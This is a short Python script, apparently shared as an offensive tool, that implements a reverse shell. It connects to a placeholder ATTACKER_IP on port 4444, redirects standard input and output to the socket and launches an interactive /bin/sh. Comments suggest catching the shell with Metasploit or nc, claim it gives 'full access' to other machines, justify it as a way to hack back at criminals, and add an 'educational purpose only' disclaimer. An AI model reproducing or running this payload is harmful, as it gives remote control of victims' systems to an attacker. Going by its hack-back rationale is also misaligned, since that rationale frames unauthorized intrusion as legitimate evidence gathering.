#Custom payload reverse shell

import socket
import subprocess
import os

s = socket.socket()
s.connect(("ATTACKER_IP", 4444))  

# Attacker IP Address to connect reverse shell
# Conect using Metasploit msfconsole or nc
# Gain full access to other  machines and control it remotly
# Can be used to to trace cyber hackers, gain full access over their machine and collect crime evidence
#Disclaimer: Educational purpose only


os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

subprocess.call(["/bin/sh", "-i"])